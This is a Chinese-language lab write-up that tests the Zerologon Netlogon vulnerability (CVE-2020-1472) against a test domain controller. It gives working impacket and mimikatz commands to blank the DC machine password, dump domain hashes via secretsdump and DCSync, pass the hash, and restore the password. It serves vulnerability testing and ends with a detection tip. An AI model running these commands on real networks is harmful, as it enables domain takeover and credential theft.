“ 微软MSRC于8月11日 发布了Netlogon 特权提升漏洞安全通告。此漏洞CVE编号CVE-2020-1472， CVSS 评分:10.0”



本文主要通过impacket以及mimikatz两种方法来测试该漏洞。

使用impacket


DC：192.168.202.129（server2008）

前提：知道域控主机名，IP地址
# 查找域控计算机名net group "domain controllers" /domain# 然后ping计算机名，查找ip还可通过ipconfig /all、nslookup等方式查找dns服务器，即为域控ip# 查看当前登录域net config workstation


impacket版本要求：Impacket v0.9.22.dev1

下载地址：

https://github.com/SecureAuthCorp/impacket

注：

默认情况下，这会更改域控制器帐户的密码。是的，这使您可以进行DCSync，但同时也会中断与其他域控制器的通信，因此请当心！
置空域控机器密码后，一定要恢复机器密码，否则会导致域内其他机器脱域


测试前获取hash效果


0x01 POC验证

POC地址https://github.com/SecuraBV/CVE-2020-1472
python3 zerologon_tester.py 主机名 IP地址



0x02  EXP验证（可获取域控hash）

注：此时机器账户密码被置空

完整利用脚本https://github.com/dirkjanm/CVE-2020-1472
测试方法：python3 zerologon_tester.py 主机名 IP地址获取hash：secretsdump.py 域名/主机名\$@IP地址 -just-dc -hashes :
例如：secretsdump.py just.com/USERLEN-8NQ83EI\$@192.168.202.129 -just-dc -hashes


测试后获取hash效果


0x03 恢复机器账户密码

1、使用administrator的hash登录域控
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5ba3e3459471d944e5d85f929837cf5d just/administrator@192.168.202.129

2、获取计算机账号原始hash
reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.saveget system.saveget sam.saveget security.savedel /f system.savedel /f sam.savedel /f security.save

3、破解sam文件，查看过去的机器密码
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

4、恢复域控机器密码
python3 reinstall_original_pw.py USERLEN-8NQ83EI 192.168.202.129 ea85136391f622ce57675b9cfb4f49de

5、查看密码是否恢复
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:5ba3e3459471d944e5d85f929837cf5d just/administrator@192.168.202.129 -just-dc-user 'USERLEN-8NQ83EI$'


这种方式获取域控权限比较复杂，需要将kali代理进内网，还有一种是使用mimikatz

使用mimikatz


测试该漏洞需使用最新mimikatz

0x01 mimikatz测试漏洞是否存在

mimikatz # lsadump::zerologon /target:192.168.202.129 /account:USERLEN-8NQ83EI$


0x02 利用CVE-2020-1472修改域控密码为空

mimikatz # lsadump::zerologon /target:192.168.202.129 /account:USERLEN-8NQ83EI$ /exploit


0x03 利用域控凭证通过dcsync获取域管hash

mimikatz # lsadump::dcsync /domain:just.com /dc:USERLEN-8NQ83EI /User:Administrator /authuser:USERLEN-8NQ83EI$ /authdomain:just /authpassword:"" /authntlm


0x04 利用获取的域管凭证进行hash注入获取一个域管权限的cmd.exe。

mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:just /rc4:5ba3e3459471d944e5d85f929837cf5d


0x05 在新开的cmd中使用mimikatz修改域控密码

mimikatz会将保存在域中的凭证以及注册表/lsass中的凭证同时修改为"Waza1234/Waza1234/Waza1234/"，这样不会影响域控的正常工作。
mimikatz # lsadump::postzerologon /target:192.168.202.129 /account:USERLEN-8NQ83EI$


tips：由于使用mimikatz会将机器改为固定的"Waza1234/Waza1234/Waza1234/"，所以在平时检查中如果发现机器密码变成了这样，就需要注意是不是被篡改了。
